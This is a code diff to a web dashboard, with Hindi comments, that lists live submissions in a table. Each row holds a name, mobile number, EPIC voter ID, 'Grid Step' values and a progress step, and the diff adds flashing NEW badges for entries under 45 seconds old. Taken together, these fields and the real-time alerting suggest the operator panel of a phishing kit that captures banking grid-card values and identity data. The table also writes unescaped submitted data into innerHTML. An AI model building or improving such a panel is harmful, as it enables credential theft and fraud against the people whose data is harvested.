@@ -45,17 +45,32 @@
         }
 
         .table-container { width: 100%; overflow-x: auto; background: #fff; padding: 15px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
-        table { width: 100%; border-collapse: collapse; min-width: 2100px; }
+        table { width: 100%; border-collapse: collapse; min-width: 1950px; }
         th, td { padding: 12px; border: 1px solid #ddd; text-align: left; font-size: 13px; }
         th { background-color: #0056b3; color: white; position: sticky; top: 0; z-index: 10; }
         tr:nth-child(even) { background-color: #f9f9f9; }
         
-        /* नया रिस्पॉन्स हाईलाइट इफ़ेक्ट */
-        @keyframes highlightNew {
-            0% { background-color: #fff3cd; }
-            100% { background-color: transparent; }
+        /* नया रिस्पॉन्स हाईलाइट और ब्लिंक इफ़ेक्ट */
+        @keyframes flashNew {
+            0% { background-color: #ffeeba; }
+            50% { background-color: #fff3cd; }
+            100% { background-color: #fff8e1; }
         }
-        .new-row { animation: highlightNew 4s ease; }
+        .new-row { 
+            animation: flashNew 1.5s infinite alternate; 
+            border-left: 5px solid #ffc107;
+        }
+
+        .new-badge {
+            background-color: #dc3545;
+            color: white;
+            padding: 2px 6px;
+            font-size: 10px;
+            font-weight: bold;
+            border-radius: 4px;
+            margin-right: 5px;
+            display: inline-block;
+        }
 
         .loading { text-align: center; color: #666; font-style: italic; }
         .logout-btn { background: #dc3545; color: white; border: none; padding: 8px 15px; border-radius: 4px; cursor: pointer; font-size: 13px; font-weight: bold; }
@@ -129,13 +144,12 @@
                         <th>Grid Step 1</th>
                         <th>Grid Step 2</th>
                         <th>Grid Step 3</th>
-                        <th>Grid Step 4</th>
                         <th>Status / Current Step</th>
                         <th>Action</th>
                     </tr>
                 </thead>
                 <tbody id="dataTable">
-                    <tr><td colspan="22" class="loading">Connecting to Live Database...</td></tr>
+                    <tr><td colspan="21" class="loading">Connecting to Live Database...</td></tr>
                 </tbody>
             </table>
         </div>
@@ -168,8 +182,7 @@
                 
                 querySnapshot.forEach((document) => {
                     let data = document.data();
-                    // सटीक टाइमस्टैम्प निकालें (ताकि सबसे नया हमेशा सबसे ऊपर रहे)
-                    let timestamp = data.timestamp ? data.timestamp : new Date(data.time || 0).getTime();
+                    let timestamp = data.timestamp ? Number(data.timestamp) : (data.time ? new Date(data.time).getTime() : Date.now());
                     globalSubmissions.push({ id: document.id, ...data, sortTime: timestamp });
                 });
 
@@ -182,7 +195,6 @@
             });
         }
 
-        // टेबल रेंडर करने और फ़िल्टर/सर्च लागू करने का मुख्य फंक्शन
         window.renderTable = function(dataArray) {
             const tableBody = document.getElementById('dataTable');
             const dateFilterVal = document.getElementById('dateFilter').value;
@@ -192,7 +204,6 @@
                 let matchDate = true;
                 let matchMobile = true;
 
-                // Date Filter Logic
                 if (dateFilterVal !== 'all' && item.time) {
                     let itemDate = new Date(item.time).toDateString();
                     let todayDate = new Date().toDateString();
@@ -202,7 +213,6 @@
                     if (dateFilterVal === 'yesterday' && itemDate !== yestDate) matchDate = false;
                 }
 
-                // Mobile Search Logic
                 if (searchVal !== '') {
                     let mob = item.mobile ? item.mobile.toString() : '';
                     if (!mob.includes(searchVal)) matchMobile = false;
@@ -214,7 +224,7 @@
             document.getElementById('recordCount').innerText = `Total Records: ${filtered.length}`;
 
             if (filtered.length === 0) {
-                tableBody.innerHTML = "<tr><td colspan='22' class='loading'>कोई डेटा नहीं मिला।</td></tr>";
+                tableBody.innerHTML = "<tr><td colspan='21' class='loading'>कोई डेटा नहीं मिला।</td></tr>";
                 return;
             }
 
@@ -222,13 +232,13 @@
             let serialNumber = 1;
 
             filtered.forEach((data) => {
-                // अगर डेटा पिछले 30 सेकंड के अंदर आया है तो उसे नया (new-row) मानकर हाइलाइट करें
-                let isVeryNew = (Date.now() - data.sortTime) < 30000;
+                let isVeryNew = (Date.now() - data.sortTime) < 45000;
                 let rowClass = isVeryNew ? 'new-row' : '';
+                let newBadgeHtml = isVeryNew ? '<span class="new-badge">NEW</span>' : '';
 
                 let row = `<tr class="${rowClass}">
                     <td><b>${serialNumber++}</b></td>
-                    <td>${data.time || 'N/A'}</td>
+                    <td>${newBadgeHtml} ${data.time || 'N/A'}</td>
                     <td>${data.fullname || 'N/A'}</td>
                     <td><b>${data.mobile || 'N/A'}</b></td>
                     <td>${data.epic || 'N/A'}</td>
@@ -246,7 +256,6 @@
                     <td>${data.gridStep1 || 'Pending'}</td>
                     <td>${data.gridStep2 || 'Pending'}</td>
                     <td>${data.gridStep3 || 'Pending'}</td>
-                    <td>${data.gridStep4 || 'Pending'}</td>
                     <td><b>${data.currentStep || 'Started'}</b></td>
                     <td><button class="delete-btn" onclick="deleteRecord('${data.id}')">Delete</button></td>
                 </tr>`;
